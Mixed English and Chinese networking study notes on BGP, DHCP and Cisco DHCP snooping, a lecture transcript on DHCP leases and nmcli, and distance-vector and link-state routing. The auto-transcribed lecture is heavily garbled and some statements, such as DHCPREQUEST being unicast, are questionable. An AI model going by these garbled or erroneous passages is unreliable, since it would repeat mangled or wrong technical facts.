◦ The routing protocol that runs the Internet (an interconnection of
multiple autonomous systems)
◦ Although some classifies BGP as a distance-vector routing protocol, it's
more accurately be described as a path-vector routing protocol,
▸ meaning that it can use as its metric 度量标准, the number of AS
hops that must be transited to reach a destination network, as
opposed to a number of required router hops.
◦ BGPs path selection is based on AS hops and a variety of other
parameters. But none of those parameters are based on link speed.
◦ incredibly scalable, but does not quickly converge in the event of a
topological change.
A network can simultaneously support more than one routing protocol through the process of route redistribution.
•
- Example:
◦ a router could have one of its interfaces participating in an OSPF area of
the network and have another interface participating in an EIGRP
area of the network.
◦ This router could then take routes learned via OSPF and inject those
routes into the EIGRP routing process.
◦ Similarly, EIGRP- learned routes could be redistributed into the OSPF
routing process.
- Cisco discovery protocol (CDP)
- Primarily used to obtain protocol addresses of neighboring devices and discover the platform of those devices.
- CDP can also be used to show information about the interfaces your router uses.
- CDP is media-and protocol-independent, and runs on all Cisco-manufactured equipment including routers, bridges, access servers, and switches. ▪


## Dynamic Host Configuration Protocol (DHCP) Servers
Most modern networks have IP addresses assigned to network devices,
logical Layer 3 addresses are used to route traffic between different networks.
How does a network device receive its initial IP address assignment? manually configure: time consuming and error prone.
dynamically assign: more efficient
The most common approach for this auto assignment of IP addresses is
Dynamic Host Configuration Protocol (DHCP) DHCP uses UDP for transport
  - the client use port 68
  - the server use port 67
Dynamically assigns an IP address to a network device,
or assign a wide variety of other IP parameters (like subnet mask, default gateway, IP address of a DNS server.)
your cable modem or DSL router might obtain its IP address from your service provider via DHCP.
In many corporate networks, when PC boots up, it receives its IP configuration info from a corporate DHCP server.
DHCP uses DORA Process.
        Discover, Offer, Request, and Acknowledge.
The exchange of messages: DHCP client obtains IP address information from a DHCP server.
Step 1 DHCPDISCOVER - broadcast message
- When a DHCP client initially boots, it has no IP address, default
gateway, or other configuration info
- To initially communicates, sending a broadcast message to discover
a DHCP server.
- broadcast message:
  - DHCPDISCOVER message to a destination address of 255.255.255.255
  - message was sent as a broadcast. broadcast cannot cross a router boundary.
- if client resides on different network than the DHCP server, the client’s next-hop router should be configured as a DHCP relay agent
  - which allows a router to relay DHCP requests to
  - either a unicast IP address
  - or a directed broadcast address for a network.
Step 2 DHCPOFFER - unicast
- When a DHCP server receives a DHCPDISCOVER message
  - it can respond with a unicast DHCPOFFER message. 2,356

▪
- DHCPDISCOVER message is broadcast, more than one DHCP server might respond to this discover request.
  - DHCP client selects the server of the first DHCPOFFER response received.
Step 3 DHCPREQUEST - unicast
- The DHCP client communicates with this selected server by sending
a
- asking the DHCP server to provide IP configuration parameters.
Step 4 DHCPACK - unicast
- The DHCP server responds to the client with a unicast DHCPACK
message.
- This DHCPACK message contains a collection of IP configuration
parameters.
dynamic addressing approach:
  - A DHCP server can be configured to assign IP addresses to devices belonging to different subnets.
  - Specifically, the DHCP server can determine the source subnet of the DHCP request and select an appropriate address pool from which to assign an address.
  - One of these address pools (which typically corresponds to a single subnet) is called a scope.
  - When a network device is assigned an IP address from an appropriate DHCP scope, that assignment is not permanent. Rather, it is a temporary assignment referred to as a lease.
Although most client devices on a network work well with this
dynamic addressing, some devices (example, servers) might need to be assigned a specific IP address.
static addressing approach:
  - you can configure a DHCP reservation
  - a specific MAC address is mapped to a specific IP address,
       ▪


## which will not be assigned to any other network device.
DHCP Snooping 监听 是一种DHCP安全特性,通常在接入层交换机上采用。
Cisco 交换机支持在每个VLAN基础上启用DHCP监听,通过这种特性， 交换机能够拦截第二层VLAN域内的所有DHCP报文。
通过建立和维护 DHCP Snooping Binding Table (DHCP监听绑定表)过 滤来自不信任区域的DHCP信息。
  - Dynamic ARP inspection (DAI): security feature on switches leverages the DHCP snooping database to help prevent man-in-the- middle attacks
DHCP Snooping绑定表包含不信任区域用户的MAC地址、IP地址、租 用期、VlanID、接口等信息，但是不保存信任区域设备的信息。
  - a great solution to prevent rogue DHCP servers on your network.
DHCP监听将交换机端口划分为两类: 信任端口(Trust):连接合法DHCP服务器的端口或者连接汇聚交换机的
上行端口;
非信任端口(Untrusted):通常为连接终端设备的端口，如PC，网络打 印机等。
     ▪


## 通过开启 DHCP Snooping
交换机限制用户 Untrusted port 只能够发送DHCP请求，丢弃来自用户
端口的所有其它DHCP报文，例如DHCP Offer报文等。
并非所有来自用户端口的DHCP请求都被允许通过，交换机会比较 DHCP请求报文头里的源MAC地址 和 (报文内容里的)DHCP客户机的 硬件地址(即CHADDR字段)，只有这两者相同的请求报文才会被转 发，否则将被丢弃. 防止 DHCP starvation attack 耗竭攻击。
信任端口可以接收并转发所有的DHCP报文。通过只将交换机连接到合 法DHCP服务器的端口设置为信任端口，其他端口设置为非信任端口， 就可以防止用户伪造DHCP服务器来攻击网络。
DHCP监听特性还可以对端口的DHCP报文进行限速，超过速率的接口 将被关闭。通过在每个非信任端口下进行限速，将可以阻止合法DHCP 请求报文的广播攻击。
DHCP监听还有一个非常重要的作用就是建立一张 DHCP Snooping Binding Table 监听绑定表，这张表一是通过DHCP Request或Ack包 中的IP和MAC地址生成的，二是可以手工指定。一旦一个连接在非信 任端口的客户端获得一个合法的DHCP Offer，交换机就会自动在 DHCP监听绑定表里添加一个绑定条目，内容包括了该非信任端口的客 户端的MAC地址、IP地址、租用期、VlanID、接口等信息。
说明:
1非信任端口只允许客户端的DHCP请求报文通过，这里只是相对于DHCP 报文来说的。其他非DHCP报文还是可以正常转发的。这就表示客户端可以 静态指定IP地址的方式通过非信任端口接入网络。由于静态客户端不会发送 DHCP报文，所以DHCP Snooping Binding Table里也不会有该静态客户端 的记录。信任端口的客户端信息不会被记录到DHCP Snooping Binding
T able里。如果有一客户端连接到了一个信任端口，即使它是通过正常的 DHCP方式获得IP地址，DHCP Snooping Binding Table里也不有该客户端
     的记录。如果要求客户端只能以动态获得IP的方式接入网络，则必须借助于 IPSG和DAI技术。
2交换机为了获得高速转发，通常只检查报文的二层帧头，获得目标MAC地 址后直接转发，不会去检查报文的内容。而 DHCP Snooping本质上就是开 启交换机对DHCP报文的内容部分的检查，DHCP报文不再只是被检查帧头 了。
3DHCP Snooping Binding Table 不仅用于防御DHCP攻击，还为后续的 DAI和IPSG技术提供动态数据库支持。
4DHCP Snooping Binding Table里的Lease列就是每个客户端对应的DHCP 租约时间。当客户端离开网络后，该条目并不会立即消失。当客户端再次接 入网络，重新发起DHCP请求以后，相应的条目内容就会被更新。
例如:下面的000F.1FC5.1008这个客户端原本插在Fa0/1端口，现在插在 Fa0/3端口，相应的记录在它再次发送
DHCP请求并获得地址后会更新为:  5当交换机收到一个DHCP Decline或DHCP Release广播报文，并且报文头 的源MAC地址存在于DHCP监听绑定表的
 一个条目中。但是报文的实际接收端口与绑定表条目中的端口字段不一致
时，该报文将被丢弃。
DHCP Release报文:此报文是客户端主动释放IP地址(如Windows客户端 使用ipconfig/release)，当DHCP服务
器收到此报文后就可以收回IP地址，分配给其他的客户端
了; DHCP Decline报文:当客户端发现DHCP服务器分配给它的IP地址无 法使用(如IP地址发生冲突)时，将发出此报
文让DHCP服务器禁止使用这次分配的IP地址。 6DHCP监听绑定表中的条目可以手工添加。 7DHCP监听绑定表在设备重启后会丢失，需要重新绑定，但可以通过设置 将绑定表保存在Flash或TFTP/FTP服务
 器上，待设备重启后直接读取，而不需要客户端再次进行绑定。
8当前主流的Cisco交换机基本都支持DHCP Snooping功能。
DHCP Snooping的作用:
1.DHCP Snooping的主要作用就是通过配置非信任端口，隔绝非法的DHCP Server;
2.DHCP Snooping与交换机DAI的配合，防止ARP病毒的传播;
3.DHCP Snooping建立和维护一张DHCP Snooping监听绑定表，这张表是
后续DAI(Dynamic Arp Inspect)和IPSG
(IP Source Guard)的基础。这两种类似的技术，是通过这张表来判定IP或
者MAC地址是否合法，来限制用户连 接到网络的。
Cisco开启DHCP Snooping后的一些默认值: 1.默认关闭，所有端口都为非信任端口，“no ip dhcp snooping trust”;
2.默认关闭，汇聚交换机丢弃从非信任端口收到的接入交换机发来的带有 Option-82 Information的DHCP报文，
“no ip dhcp snooping information option allow-untrusted”; 1开启后，汇聚交换机接收从非信任端口收到的接入交换机发来的带有
Option-82 Information的DHCP报文。 3.默认开启，为非信任端口收到的DHCP包插入Option 82，“ip dhcp
snooping information option”; 1关闭后，汇聚交换机接收从非信任端口收到的接入交换机发来的不带
Option-82 Information的DHCP报文。
4.默认开启，限制对非信任接口DHCP包的转发速率为15个/s，“ip dhcp snooping limit rate 15”; 5.默认开启，检测源MAC地址和CHADD字段是否相同，“ip dhcp snooping verify mac-address”;
6.默认开启，DHCP监听绑定表发生更新后，默认等待300s后再写入文件， “ip dhcp snooping database write-delay 300”;
7.默认开启，DHCP监听绑定表尝试写入操作失败后，默认直到300s后停止 尝试，
“ip dhcp snooping database timeout 300”。 Option 82
它被称为DHCP Relay Agent Information Option(DHCP中继代理信息选 项)，选项号为82，故被称为Option 82，相关标准文档为RFC3046。当 DHCP服务器和客户端不在同一个子网内时，客户端要想从DHCP服务器上 分配到IP地址，就必须由DHCP中继代理(DHCP Relay Agent)来转发DHCP 请求包。DHCP中继代理将客户端的DHCP报文转发到DHCP服务器之前， 可以插入一些选项信息，以便DHCP服务器能更精确的得知客户端的信息， 从而能更灵活地按相应的策略分配IP地址和其他参数。
DHCP中继代理(Option 82、DHCP Snooping)和DHCP Server之间的关 系:
1.交换机开启了DHCP Snooping功能后，默认情况下，将对从非信任端口收 到的DHCP请求报文插入选项82信息;
1>默认时SW2(上行交换机)从Untrusted端口到带有Option 82的DHCP请求 报文时会将这个报文丢弃;  1可以在 SW2上配置“ip dhcp snooping information allow-untrusted”全局命令，将不
丢弃该报文;
2可以在SW2的Untrusted接口配置“ip dhcp snooping trust”接口命令，这
样SW2就能接收带有Option 82 的DHCP请求报文了，但是不建议这样做，因为这样将不建立该接口的
DHCP监听绑定表，会降低安全性。
2>DHCP Srver和DHCP Client在同一个子网的情况下，交换机会把Option
82的值填为0(即0.0.0.0)。
2.以Windows Server 2003为DHCP的服务器不认为Option 82的值为0的 DHCP请求报文是错误的;  以Cisco IOS为 DHCP的服务器默认时会认为Option 82的值为0的DHCP请求报文是错误
的，它将丢弃这个报文。  1>可在SW1上配置“no ip dhcp snooping information option”命令，不插入 Option 82;
2>可在R1上选择配置以下命令，允许Option 82的值为0的DHCP请求报文 通过:
1接口命令:“ip dhcp relay information trust”，仅对路由器当前接口有 效;
2全局命令:“ip dhcp relay information trust-all”，对路由器所有接口有 效。
说明:
当一台开启DHCP监听的汇聚交换机和一台插入了选项82信息的边界交换机 (接入交换机)相连时: 1如果边界交换机是连接到汇聚交换机的信任端口，那么汇聚交换机会接收 从信任端口收到的插入选项82的DHCP
报文信息，但是汇聚交换机不会为这些信息建立DHCP监听绑定表条目;2 如果边界交换机是连接到汇聚交换机的非信任端口，那么汇聚交换机会丢弃 从该非信任端口收到的插入了选项
82的DHCP报文信息。但在IOS12.2(25)SE版本之后，汇聚交换机可以通过 在全局模式下配置一条:“ip dhcp
snooping information allow-untrusted:命令。这样汇聚交换机就会接收从 边界交换机发来的插入选项82的
DHCP报文信息，并且也为这些信息建立DHCP监听绑定表条目;3在配置 汇聚交换机下联口时，将根据从边界交换机发送过来的数据能否被信任而设 置为信任或者非信任端口。
总之:要想支持选项82的扩展应用，则DHCP服务器本身必须支持选项82以 及收到的DHCP报文必须被插入选项82信息。一般二层交换机都支持选项82 功能，通常只支持一部分，完全支持的很少。
DHCP Snooping实验 配置命令  说明:“ip dhcp snooping binding 000f.1fc5.1008 vlan 10 192.168.10.131 int f1/2 expiry 692000”条
目中“expiry”参数为4294967295时表示绑定永不过期。  1、单机交换
 (DHCP服务器和DHCP客户端位于同一VLAN)
环境:Windows2003 DHCP服务器和客户端都位于Vlan 10;服务器接在
F0/1，客户端接在F0/2。 2960交换机相关配置:  说明: 1本例中交换机对于客户端的DHCP请求报文将插入选项82信息，也可以通
过配置“no ip dhcp snooping
information option”命令选择不插入选项82信息，两种情况都可以。2客户 端端口推荐配置“spanning-tree portfast”命令，使得该端口不参与生成数计 算，节省端口启动时间，
防止可能因为端口启动时间过⻓导致客户端得不到IP地址。3开启DHCP监 听特性的VLAN并不需要该VLAN的三层接口被创建。  2、单交换机(DHCP服务器和DHCP客户端位于同一VLAN)
环境:Cisco IOS DHCP服务器(2821路由器)和PC客户端都位于Vlan 10;路
由器接在F0/1，客户端接在F0/2。2960交换机相关配置:
2821路由器相关配置:
说明:
1需要注意的是路由器连接到交换机的端口需要配置“ip dhcp relay
 information trusted”命令，否则客户 端将无法得到IP地址。这是因为交换机配置了(默认情况)“ip dhcp snooping
information option”命令， 此时交换机会在客户端发出的DHCP请求报文中插入选项82信息。另一方
面由于DHCP服务器(这里指Cisco IOS DHCP服务器)与客户端处于同一个VLAN中，所以请求实际上并没有经过
DHCP中继代理。
2对于Cisco IOS DHCP服务器来说，如果它收到的DHCP请求被插入了选
项82信息，那么它会认为这是一个从DHCP 中继代理过来的请求报文，但是它检查了该报文的giaddr字段却发现是
0.0.0.0，而不是一个有效的IP地址 (DHCP请求报文中的giaddr字段是该报文经过的第一个DHCP中继代理的IP
地址，具体请参考DHCP报文格式)，因 此该报文被认为“非法”，所以将被丢弃。可以参考路由器上的DHCP的
debug过程。
3Cisco IOS里有一个命令，专⻔用来处理这类DHCP请求报文“ip dhcp relay
information trusted”(接口命
令)或者“ip dhcp relay information trust-all”(全局命令，对所有路由器接口都
有效);这两条命令的作 用就是允许被插入了选项82信息，但其giaddr字段为0.0.0.0的DHCP请求报
文通过。
4如果交换机不插入选项82信息，即配置了“no ip dhcp snooping
information option”命令，那么就不会出 现客户端无法得到IP地址的情况，路由器也不需要配置“ip dhcp relay
information trusted”命令。
5Windows DHCP服务器则不认为Option 82的值为0.0.0.0的DHCP报文是错
误的，所以上一个实例中不论交换机是 否插入选项82信息，客户端总是可以得到IP地址。
3、单交换机(DHCP服务器和DHCP客户端位于不同VLAN)
环境:Cisco IOS DHCP服务器(2821路由器)的IP地址为192.168.2.2，位于 Vlan 2;DHCP客户端位于Vlan 10;交换机为3560，路由器接在F0/1，客户 端接在F0/2。
3560交换机相关配置:
  2821路由器相关配置:
说明:
1本例中的路由器不需要配置“ip dhcp relay information trusted”命令，因为 从交换机过来的DHCP请求经
过了中继代理，其报文中的giaddr字段为192.168.10.1，而不是0.0.0.0，是 默认正常的DHCP请求报文。4、多交换机环境(DHCP服务器和DHCP客户端  位于不同VLAN) 环境:2611路由器作为DHCP服务器，IP地址为192.168.2.2，位于Vlan 2; PC位于Vlan 10;路由器接在3560的G0/2，PC接2960的F0/1口，两交换机 互连口都是G0/1。  3560交换机相关配置:  2960交换机相关配置:  2611路由器相关配置: 说明:
1本例中3560没有开启DHCP监听功能，2960开启了该功能。需要注意的是 int vlan 10需要配置“ip dhcp
relay information trusted”命令，理由如同实例2。 5、多交换机(DHCP服务器和DHCP客户端位于同一VLAN)  环境:3560交换机自身作为DHCP服务器;PC1和PC2都位于Vlan 10;PC1 接3560的F0/1口，PC2接2960的F0/1口;两交换机互连口都是G0/1。  3560交换机相关配置:  2960交换机相关配置: 说明:
1本例中3560和2960同时开启了DHCP监听功能。从2960过来的DHCP请求 报文是已经被插入了选项82信息，如果将
3560的G0/1设置为信任端口，那么插入了82选项的DHCP请求报文是允许 通过的，但不会为其建立DHCP监听绑定
表。即3560上只有PC1的绑定条目，而没有PC2的绑定条目。2如果此时 同时部署DAI，IPSG，由于2960不支持这两项功能，对于3560来说，从 2960上过来的数据可能存在IP
欺骗和ARP欺骗等攻击，是不安全的。另一方面，由于3560没有PC2的绑 定条目，而DAI和IPSG必须依赖DHCP监
听绑定表。因此如果需要在3560上再部署DAI或者IPSG，就不能将3560的 G0/1设置为信任端口。 会丢弃收到的插入了82选项的DHCP请 求报文。而从2960过来的DHCP请求报文又正好是被插入了选项82信息
的。因此必须配置“ip dhcp
snooping information option allow-untrusted”命令，否则3560将丢弃这些
DHCP请求报文，接在2960上的 PC2将得不到IP地址。只有配置了该命令以后，3560才会接收从2960发送
的插入了选项82的DHCP报文，并为这 些信息建立绑定条目。
43560下联的G0/1口由于是非信任端口，默认限速为每秒15个DHCP请求报 文，如果2960上的所有PC都同时发起
DHCP请求，可能此端口会被errdisable掉。这里假设2960为24口，因此简 单的设置限速为24*15=360。
52960上联的G0/1口必须被配置为信任端口，否则将丢弃从3560过来的 DHCP应答报文，PC2将无法得到IP地址。  (DHCP服务器和DHCP客户端位于同一VLAN)
环境:4503交换机自身作为DHCP服务器;PC1和PC2都位于Vlan 10;PC1 接4503的G2/1口，PC2接3560的F0/1口;两交换机互连口是4503 G1/1 -- 3560 G0/1。
2,384
6、多交换机环境

 4503交换机相关配置: 3560交换机相关配置:  说明: 1本例中4503和3560同时开启了DHCP监听功能。由于4503的下联口被设
置为信任端口，所以从3560过来的DHCP请 求报文即使已经被插入了选项82信息，也允许通过的，但不会为其建立
DHCP监听绑定表。所以4503上只有PC1 的绑定条目，而没有PC2的绑定条目。
2作为接入层交换机的3560支持DAI，IPSG，如果同时配置这两项功能，那 么有理由相信从3560过来的数据是已
经经过检验的安全数据，因此将4503的下联口设置为信任端口是可行的。 另外，4503没有PC2的绑定条目，也
 减少了系统运行时所需的内存空间。 DHCP Starvation Attack:
1. broadcasting DHCP requests with spoofed MAC addresses
  - easily achieved with attack tools such as gobbler Internet
Security Lab.1 5
2. If enough requests are sent, the network attacker can exhaust the
address space available to the DHCP servers for a period of time
4. The network attacker then set up a rogue DHCP server on his or her
system and respond to new DHCP requests from clients on the
network.
5. a network attacker can provide clients with addresses and other
network information
6. Since DHCP responses typically include default gateway and DNS
server information, the network attacker can supply his or her own system as the default gateway and DNS server resulting in a "man-in- the-middle" attack.
DHCP makes managing thousands of host IPs and a virtual or automated infrastructure on a secure network much, much easier.
DHCP creates 3 potential points of failure in network connectivity. - The DHCP host itself,
  - if it is miss configured - a rouge the DHCP host,
  - present network configurations that could route traffic to a different router for nefarious purposes, or you could have somebody standing up a DHCP host because they don't even know any better on your network.
- and DNS
 - That could be a problem if the host IPs are transiting and changing, you'll need to rely on fully qualified domain names for the host to host communication. This place is a dependency on DNS for FQDN for IP resolution.
DHCP lease
DHCP server will grant a lease on an IP address, assigning it to the host for a period of time
Lease information on the host:
$ cat /var/lib/dhclient/dhclient.leases
Lookup DHCP host:
$ sudo grep “DHCPOFFER” /var/log/message
the HTP requests and offer a layer to broadcast similar to our request and require running DHCP client. The D H E P server uses UDP Port 67. The client uses UDP Port 68
and you can use reservations to make sure that the same hosts get new leases on the same I P's upon expiration. So to view the lease information on the host, this is going to be a little bit different between Ubuntu and CentOS and Debian et cetera. But if you can't out of our lib d h c, you can generally find it. In this case, I'm referencing varlet D H client D H client dot leases. You can always grab three of our log messages for D H cp offer you might have to use of our log star if your log rotate is rotating your messages more frequently than your lease is updating. So let's look at the D H CP sequence. The first thing that's going to happen is the client broadcast a request on the network for host that can assign it an I P. Address. So I'm a brand new device. I'm on this fresh network. I have to send out a request. Hey, somebody give me an I P address. The D H CP offer comes in from the D. H. C P server. It will respond with an offer of an I P address and then I will request that I p address. Officially, I'll say Okay, you're offering me 192.168 dot 11.100. I'll take it. That is my request. The D. A. C P server will then acknowledge that request and say, All right, it's yours. So the D H e p server acknowledges Thea P Address has been assigned So enough the conceptual Let's take a look at what this looks like in real life. I have an Ubuntu VM running here and this tab I've started wire shark, and in this tab, I just have my console. So the first thing I want to do is take a look at by D H C P lease information. This path is going to be a little different on CentOS but if you use tab complete, you'll still find it. So I'm going to get out of our liberty. H c p D H client dot leases and I can see my lease information for interface in as 33. At this I p went into 168 51 1 87 My sub nets to 552552550 My gateway is 19 to 1 68 51 2 Here's my lease time. Here's my DNS host, and then there's some additional DHCP information here in addition to our renew, rebound and expire times. So the next thing I'm going to do is take a look and make sure that my D H C P client is running. And so for that I'm going to use SS listening on UDP. And I want the number of the ports and I'm going to grab for D H Plant. And of course, after you pseudo for this. And I can see that it's running on Port 68 or rather listening on Port 68 UDP. So the next thing I'm going to do is jump down here and start a packet capture and we're capturing. So I need to release my I p address. I want to use the H client Tak are for that. And then I'm going to restart my Deitch client. That's awful looking. My package captures I have lots of information here going to stop it and I'm going to filter for boot P. And I can see here is where released it. Here is the discover the broadcast. So if we look down here source Portis 68. Destination port is 67. Here is the offer, and if I scroll down here, I can see that it's offering one. Done to 1 68 51 1 87 Here is the request where my client sends back Yes, I'll take that I p address requested I p address 192168 51 1 87 And here is where the d h c P server acknowledges that request. And I now have that address. Let's talk about static IPs for a couple minutes. You need to provide the following information to set a static I p p i p address the net mask the Gateway I p the D. N s host, which is optional, and the DNS domain, which is also optional. So let's take a look at that. So let's look at how we can set a static i p when we already have a DHCP IP. So I'm back on my Ubuntu VM and you can see I've got 192168 51 1 85 And we know from earlier that this is running d h c p. So if I wanted to set this as a static, I p I would use NMC lie connection modify, and I would modify the wired connection one that is this connection name appeared the top and I would set the i p v four dot method and you can tab complete here to manual. I would set the I P v four address to something like 192.168 dot 51.1 91. So something different from 1 85 and I'd go ahead and use the cider notation for the sub net now also have to provide the gateway so happy before dot Gateway and already know that the gateway is 192168 51 2 So I'll reuse that and I'm not going to add any DNS information so hit enter that has applied. The change hasn't taken effect yet, So if you're using them mm cli I'll see that I still have 1 85 so I need to drop the connection and pick it back up. For that. I use nmcli con down, and I'll use wire connection one, and then I'll do the same thing with con up, and you can now see, I have IP 191 So if I try to ping 1.1.1.1. I get some information back. However, if I try to paying something like google dot com I'm not gonna get anything back because I haven't added a d n a server. So let's go ahead and do that in nmcli con Mod Wired I p v for D. N s and I'm going to use 192.168 dot 51.1. I've got to drop the connection again. Take a look. We now have some tea in this information Down there was trapping and Google still not going to work because I put the wrong I p address. So let's fix that. Let's go back and put I p address two in, Take our connection down. Bring our connection up. Look at it. We now have the right I p address in there and we'll pin google dot com and everything is fine, so there's a little bit of trouble shooting in that on. That's how you set this. If you wanted to send it back to D h c P. I would use an empty ally Connection Modify. And we're working with wire connection one here, remember, that's the name of our connection. And I'm going to set a pv four dot method to auto. I'm going to set a pv four dot address to nothing. I pee before dot d n s to nothing in our pv four dot gateway to nothing. I've got to drop the connection and bring it back up. Take a look at nmcli we're back to I p 19 to 1 68 51 1 85 We can paying 1.1 dot one up one again. Everything is good and we can try to ping Google and everything's good. So we've restored our connectivity. So he switched from D h C P to static. And then we switched back to the HCP. So in conclusion that the HCP host provisions I p addresses to network devices upon request, we looked at a command line Example of lease information. The D H CP request is a layer to broadcast. The sequence is discover offer request acknowledge. We looked at a wire shark example of the D H cp request sequence to use a static i p You must provide all of the network information. And we looked at the command line example of going from D H cp to static and back to D H cp. This lesson is now complete. Thanks for watching.
teaming and bonding
        Route Advertisement Method
Characteristic of a routing protocol: how it receives, advertises, and stores routing information.
The two fundamental approaches are distance vector and link state. There are 3 major protocols for unicast routing:
  - Distance Vector Routing: sends a full copy of its routing table to its directly attached neighbors. even if there has no topological changes.
  - Link State Routing:
  - uses link-state routers to exchange messages that allow each router to learn the entire network topology.
  - exchange full routing information only when two routers initially form their adjacency.
  - shorter convergence times, as compared to distance- vector routing protocols.
  - Path-Vector Routing
Distance Vector routing protocol 路由演算法
a periodic advertisement:
  - sends a full copy of its routing table to its directly attached
neighbors.
  - even if there has no topological changes.
  - re-advertise its full routing table at regular intervals.
Drawback:
  - 1. Inefficient. (periodic advertisement cause redundant information)   - 2. the time they take to converge:
  - the time required for all routers to update their routing
table for topological change in a network. Hold-down timers: can speed the convergence process.
  - After a router makes a change to a route entry, hold-down timer prevents any subsequent updates for a specified period of time.
  - This approach helps stop flapping routes (routes that oscillate between being available and unavailable) from preventing convergence.
  - 3. routing loop
  - hop count: the metric being used in this topology, the number of routers that must be crossed to reach a network.
  - Example:
⁃
  - R3’s routing table has a route entry: network 10.1.1.0/24
available off of R1, with metric (hop count) of 2. (to reach
network 10.1.1.0/24, 2 routers must be transited (R2 and R1)).
  - imagine that interface Ethernet 1/0 on router R3 goes down.
  - R3 loses its directly connected route to 10.1.4.0/24(with metric
0)
  ⁃
  - But R2 still had a route to 10.1.4.0/24 in its routing table (with
metric 1)
  - R2 advertised to R3.
  - R3 adds this entry for 10.1.4.0/24 and increments the metric by
2.
 ⁃
  - (Originally R2’s routing table was due to advertisement from
R3)
  - The routing loop continues, R3 advertises its newly learned
route to its neighbor R2, R2 learned from router R3.
  - R2 updated routing table with metric of 3.
  - The metric for the 10.1.4.0/24 network continues to increment
in the routing tables for both R2 and R3, until the metric reaches a value considered to be an unreachable value (like 16 in RIP).
  - This process is referred to as a routing loop. Distance-vector routing protocols's approaches for preventing routing loops:
Count to infinity: 定義Hops Count的最大值.
  - RIP 預設最大值為16，16之後，就不再繼續增加。Routing Table, 16表示這條路徑是無法到達的, 不會繼續把這樣的資料分 送給其他Router設備。
Split horizon 水平分割:
  - Prevents route learned on one interface from being advertised
back out of that same interface.
  - 絕對不向這筆資訊的來源端發送與這筆資料相關的更新動作。
Poison reverse毒性逆转:
  - Causes a route received on one interface to be advertised back
out of that same interface with a metric considered to be
infinite.
  - 自己关于那个网段的路由信息“毒化”，在路由表中表示为“16 or
infinity”
Link State routing protocol
Link-state routing protocol.
Allows routers to build a topological map of the network, a router can
execute an algorithm to calculate an optimal path (or paths) to a destination network.
The basic idea of link-state protocols:
  - Every node knows how to reach its directly connected
neighbors, the link state to its neighbors (up / down) and the cost of each link, then every node can build a complete map of the network.
This is clearly a sufficient condition (although not a necessary one) for finding the shortest path to any point in the network.
Thus, link-state routing protocols rely on two mechanisms:
  - reliable dissemination of link-state information
  - the calculation of routes from the sum of all the accumulated link-state knowledge. Reliable Flooding
Reliable flooding: making sure all the nodes participating in the routing protocol get a copy of the link-state information from all the other nodes.
Each node send its link-state information out on all of its directly connected links;
Each node that receives this information then forwards it out on all of its links.
Process continues until the information has reached all the nodes in the network.
Each node creates an update packet link-state packet (LSP), contains following information:
The ID of the node that created the LSP
A list of directly connected neighbors with the cost of the link to reach. A sequence number
A time to live for this packet
  - The first two: to enable route calculation;
  - the last two : make the process of flooding the packet to all nodes
reliable.
Sequence numbers: to make sure the old info is replaced by newer info.
Each time a node generates a new LSP, it increments the sequence number by 1.
these sequence numbers are not expected to wrap, so the field is quite large (say, 64 bits).
If a node goes down and then comes back up, it starts with a sequence number of 0.
If the node was down for a long time, all the old LSPs for that node will have timed out; otherwise, this node will eventually receive a copy of its own LSP with a higher sequence number, which it can then increment and use as its own sequence number. This will ensure that its new LSP replaces any of its old LSPs left over from before the node went down.
Time to live: to ensure that old link-state information is eventually removed from the network.
A node always decrements the TTL of a newly received LSP before flooding it to its neighbors. It also “ages” the LSP while it is stored in the node.
When the TTL reaches 0, the node refloods the LSP with a TTL of 0, which is interpreted by all the nodes in the network as a signal to delete that LSP.
Reliability: making sure that you have the most recent copy of the information (not multiple, contradictory LSPs).
Making the flooding reliable has proven to be quite difficult. (Example, an early version of link-state routing used in the ARPANET caused that network to fail in 1981.)
Flooding works in the following way.
First, transmis LSPs between adjacent routers (using acknowledgments and retransmissions just as in the reliable link-layer protocol).
More steps are necessary to reliably flood an LSP to all nodes in a network. Consider a node X that receives a copy of an LSP from node Y. (Y may be any
other router in the same routing domain as X).
X checks to see if it has already stored a copy of an LSP from Y.
  - If not, it stores the LSP.
  - If it already has a copy, it compares the new LSP’s sequence numbers;
  - a larger sequence number, it is more recent.   - X store that LSP, replace the old one.   - X sends a copy of that LSP to all of its neighbors except Y. (LSP is not sent back to the node from which it was received helps to bring an end to the LSP flooding)
  - X passes the LSP on to all its neighbors, neighbors do the same thing, thus the most recent copy of the LSP eventually reaches all nodes.
  - A smaller/equal sequence number, it is not newer than the one stored.
  - X discard it, no further action would be needed.
When B receives two identical 同一的 copies of the LSP from X, it will accept the first arreived one and ignore the second as a duplicate. It then passes the LSP onto D, D has no neighbors to flood, and the process is complete.
As RIP, each node generates a new LSPs under two circumstances:
the expiry of a periodic timer
a change in topology
one of its directly connected links or immediate neighbors has gone down. (the
 only topology-based reason for a node to generate an LSP)
The failure of a link can be detected in some cases by the link-layer protocol.
Each node sends periodic “hello” packets to its neighbors at defined intervals.
If a sufficiently long time passes without receipt of a “hello” from a neighbor, the link to that neighbor will be declared down, and a new LSP will be generated to reflect this fact.
One of the important design goals of link-state protocol’s flooding:
The newest information must be flooded to all nodes as soon as possible, while old information must be removed from the network and not allowed to circulate.
minimize the total amount of routing traffic that is sent around the network;
Reduce overhead: avoid generating LSPs unless necessary.
Using very long timers for the periodic generation of LSPs (per hours)
The messages saying “nothing has changed” do not need to be sent very often.
Route Calculation
Once node has copy of the LSP from every other node
Thus, it is able to compute a complete map for the topology of the network, Thus, it is able to decide the best route to each destination.
It calculates routes based on Dijkstra’s shortest-path algorithm.
 Imagine a node takes all the LSPs it has received and constructs a graphical map of the network,  N: the set of nodes in the graph,
l(i,j): the nonnegative cost (weight) associated with the edge between nodes i,j ∈
N and l(i,j) = ∞ if no edge connects i and j.
s ∈ N: node s (node s execute the algorithm to find the shortest path to all the
other nodes in N.)
The algorithm maintains the following two variables:
M: the set of nodes incorporated so far by the algorithm
C(n): the cost of the path from s to each node n.
the algorithm is defined as follows:
M = {s}
for each n in N − {s}
C(n)=l(s,n) while (N ̸ = M)
M = M ∪ {w} such that C(w) is the minimum for all w in (N − M) for each n in (N − M )
C(n) = MIN(C(n),C(w) + l(w,n))
Basically, the algorithm works as follows.
We start with M containing this node s and then initialize the table of costs (the C(n)s) to other nodes using the known costs to directly connected nodes.
We then look for the node that is reachable at the lowest cost (w) and add it to M.
Finally, we update the table of costs by considering the cost of reaching nodes through w.
In the last line of the algorithm, we choose a new route to node n that goes
through node w if the total cost of going from the source to w and then  following the link from w to n is less than the old route we had to n.
This procedure is repeated until all nodes are incorporated in M .
